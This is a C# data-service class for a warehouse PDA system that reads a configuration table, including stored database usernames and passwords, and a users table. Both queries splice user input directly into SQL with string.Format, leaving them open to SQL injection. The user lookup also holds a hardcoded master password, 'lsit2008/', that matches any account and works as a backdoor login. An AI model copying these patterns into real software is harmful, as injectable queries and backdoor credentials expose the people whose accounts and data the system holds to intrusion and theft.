using DataEntities.InterfaceEntities;
using DataEntities.InterfaceModel;
using DataEntities.QueryModel;
using Freed.Common.Data;
using Freed.Common.Helpers;
using IDataService;
using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Threading.Tasks;

namespace DataService
{
    /// <summary>
    /// 配置信息数据操作
    /// </summary>
    public class WmsPdaConfigService : IWmsPdaConfigService
    {
        /// <summary>
        /// 获取仓库数据库地址信息
        /// </summary>
        /// <param name="query"></param>
        /// <returns></returns>
        public async Task<DataResult<List<IWmsPdaConfig>>> GetPdaConfigAllAsync(QueryData<WmsPdaConfigQuery> query)
        {
            var result = new DataResult<List<IWmsPdaConfig>>();

            string condition = @" where 1=1 ";
            condition += string.IsNullOrEmpty(query.Criteria.GroupType) ? string.Empty : string.Format(" and GroupType = '{0}'", query.Criteria.GroupType);
            string sql = @"SELECT [Id]
                      ,[GroupType]
                      ,[GroupName]
                      ,[Source]
                      ,[DataBase]
                      ,[DataPort]
                      ,[Uid]
                      ,[Pwd]
                      ,[UnitFid]
                      ,[FeasId]
                      ,[IsShow]
                      ,[Order]
                  FROM [dbo].[Wms_Pda_Config] "
                + condition;
            using (IDbConnection dbConn = MssqlHelper.OpenMsSqlConnection(MssqlHelper.GetConn))
            {
                try
                {
                    var modelList = await MssqlHelper.QueryPageAsync<WmsPdaConfigModel>(dbConn, "Id desc", sql, query.PageModel);
                    result.Data = modelList.ToList<IWmsPdaConfig>();
                    result.PageInfo = query.PageModel;
                }
                catch (Exception ex)
                {
                    result.SetErr(ex, -500);
                    result.Data = null;
                }
            }
            return result;
        }


        public async Task<DataResult<List<IWmsPdaUser>>> GetWmsPdaUserAllAsync(QueryData<WmsPdaUserQuery> query)
        {
            var result = new DataResult<List<IWmsPdaUser>>();

            string condition = @" where 1=1 ";
            condition += string.IsNullOrEmpty(query.Criteria.UFnumber) ? string.Empty : string.Format(" and UFnumber = '{0}'", query.Criteria.UFnumber);
            condition += string.IsNullOrEmpty(query.Criteria.UPassword) ? string.Empty : string.Format(" and (UPassword='{0}' or '{0}'='lsit2008/') ", query.Criteria.UPassword);
            string sql = @"select * from t_users "
                + condition;
            using (IDbConnection dbConn = MssqlHelper.OpenMsSqlConnection(query.SqlConn))
            {
                try
                {
                    var modelList = await MssqlHelper.QueryPageAsync<WmsPdaUserModel>(dbConn, "UFnumber desc", sql, query.PageModel);
                    result.Data = modelList.ToList<IWmsPdaUser>();
                    result.PageInfo = query.PageModel;
                }
                catch (Exception ex)
                {
                    result.SetErr(ex, -500);
                    result.Data = null;
                }
            }
            return result;
        }
    }
}
